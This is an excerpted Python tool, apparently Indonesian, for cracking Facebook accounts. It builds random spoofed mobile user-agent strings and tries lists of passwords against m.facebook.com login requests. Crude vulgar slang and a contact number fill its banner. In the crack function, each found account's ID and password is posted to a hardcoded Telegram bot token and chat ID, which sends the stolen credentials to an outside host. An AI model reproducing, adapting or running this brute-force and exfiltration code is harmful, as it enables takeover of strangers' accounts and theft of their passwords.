...
uas_bawaan = "Mozilla/5.0 (Linux; Android 9; 8; SM-G955UA843J) ) AppleWebKit/537.36 (KHTML, like Gecko) OculusBrowser/8.1.5.203450095 SamsungBrowser/4.0 Chrome/79.0.3945.12686.0.4287.118 Mobile VR Safari/537.36"
uas_nokiac2 = "Mozilla/5.0 (linux; U; Android 6;  en-us; GT-P902L)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4256.60 Mobile Safari/537.36"
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 6; '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='RMX1941 Build /PPR1.180610.011;'
	e=random.randrange(100, 9999)
	f='wvJ507M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4809.66'
...
┌──────────────────────────────────────────────────────────────────────────────                                                                                                                                             
╭━━━━┳━━━┳╮╱╱╭╮╱╱╱╭━━┳━━━╮ #RECODE BY:ZALL
╰━━╮━┃╭━╮┃┃╱╱┃┃╱╱╱╰┫┣┻╮╭╮┃ #AUTHOR ASLI CUMA ALVINO NGAP
╱╱╭╯╭┫┃╱┃┃┃╱╱┃┃╱╱╱╱┃┃╱┃┃┃┃ #UTAMAKAN COLI DULU BRE
╱╭╯╭╯┃╰━╯┃┃╱╭┫┃╱╭╮╱┃┃╱┃┃┃┃ #WA:0882002396242
╭╯━╰━┫╭━╮┃╰━╯┃╰━╯┣┳┫┣┳╯╰╯┃ #FB:ZALL
╰━━━━┻╯╱╰┻━━━┻━━━┻┻━━┻━━━╯ #MOGA IJO BRE                                                                     
└──────────────────────────────────────────────────────────────────────────────  	
			{m} ☯︎ {k} ☯︎ {h} ☯︎ {sir} Recode : ZALL.ID{x}{m} ☯︎ {k} ☯︎ {h} ☯︎ {x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t(↻ ◁ II ▷ ↺MOGA IJO YA ASU: [green]MASUKAN COOKIE LU MEK  [white] (;´༎ຶٹ༎ຶ`)'))
...
def passwrd():
	...
	if woi in ['y','Y']:
		...
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,HayangMemekBadeEnak):
	global loop,ok,cp
	...
	prog.advance(des) 
	for pw in HayangMemekBadeEnak:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=344190606773871&kid_directed_site=0&app_id=344190606773871&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D344190606773871%26redirect_uri%3Dhttps%253A%252F%252Fauthenticate.riotgames.com%252Fredirects%252Ffacebook%26state%3D08703c02ec4042266f3c6ab05ea0a3d6b2663d5f5695d47498554fdfbbec%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D89175d0c-f4d1-4769-a7da-7a5b95d4eb0e%26tp%3Dunspecified%26cbt%3D1677471599751&cancel_url=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D08703c02ec4042266f3c6ab05ea0a3d6b2663d5f5695d47498554fdfbbec%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			...
			"email":idf, 
			"next":"https://mobile.facebook.com/v13.0/dialog/oauth?client_id=344190606773871&redirect_uri=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook&state=08703c02ec4042266f3c6ab05ea0a3d6b2663d5f5695d47498554fdfbbec&scope=email&ret=login&fbapp_pres=0&logger_id=89175d0c-f4d1-4769-a7da-7a5b95d4eb0e&tp=unspecified&cbt=1677471599751&_rdr",
			"pass":pw,
			"login":"submit"
			}
			po = ses.post(f"https://m.facebook.com{xxxx}", data=date,headers={"user-agent":ua,},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(Panel.fit(f"""[bold yellow]CHECK KAKAK [bold white]""",style=f"bold red"))
				...
				NgapungMang(tree)
				requests.post(f"https://api.telegram.org/bot5840024292:AAFbkDTWG-NYu-mCp4cxm7GzrxwBssNthuI/sendMessage?chat_id=5485708424&text=CP {idf}|{pw}")
				...
				tree = Tree(Panel.fit(f"""[bold green]SUCCSES KAKAK [bold white]""",style=f"bold green"))
				...
				NgapungMang(tree)
				requests.post(f"https://api.telegram.org/bot5840024292:AAFbkDTWG-NYu-mCp4cxm7GzrxwBssNthuI/sendMessage?chat_id=5485708424&text=OK {idf}|{pw}")
